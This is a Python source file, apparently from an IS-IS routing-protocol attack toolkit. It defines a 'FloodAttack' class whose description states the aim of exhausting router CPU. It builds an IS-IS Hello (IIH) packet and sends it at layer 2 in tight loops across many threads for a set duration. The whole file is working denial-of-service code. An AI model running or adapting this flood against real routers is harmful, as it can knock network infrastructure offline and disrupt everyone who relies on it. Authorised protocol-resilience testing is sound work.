import threading
import time
from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import DoSConfig
from isis_attack.core.packet import build_iih_packet
from isis_attack.network.sender import PacketSender


class FloodAttack(BaseAttack):
    name = "flood"
    description = "多线程高频发送 IIH/LSP 报文耗尽路由器 CPU"
    category = AttackCategory.DOS
    config: DoSConfig

    def setup(self) -> None:
        from isis_attack.network.adapter import get_local_mac
        self._src_mac = get_local_mac(self.config.iface)
        self._senders = []
        for _ in range(self.config.thread_count):
            self._senders.append(PacketSender(
                iface=self.config.iface, packet_rate=self.config.packet_rate, max_packets=0,
            ))
        self._stop_event = threading.Event()
        self._flood_pkt = build_iih_packet(
            sys_id=self.config.sys_id, area_addr=self.config.area_addr,
            src_mac=self._src_mac, level=self.config.level,
        )

    def launch(self) -> AttackResult:
        def _flood_worker(sender):
            pkt = self._flood_pkt
            while not self._stop_event.is_set():
                sender.send_l2(pkt)

        threads = []
        for sender in self._senders:
            t = threading.Thread(target=_flood_worker, args=(sender,), daemon=True)
            t.start()
            threads.append(t)

        time.sleep(self.config.duration)
        self._stop_event.set()
        for t in threads:
            t.join(timeout=2)

        total_sent = sum(s.sent_count for s in self._senders)
        return AttackResult(
            success=True, packets_sent=total_sent, target_affected=False,
            details=f"泛洪攻击: {total_sent} packets, {self.config.thread_count} threads",
        )

    def verify(self) -> bool:
        return sum(s.sent_count for s in self._senders) > 0

    def teardown(self) -> None:
        self._stop_event.set()
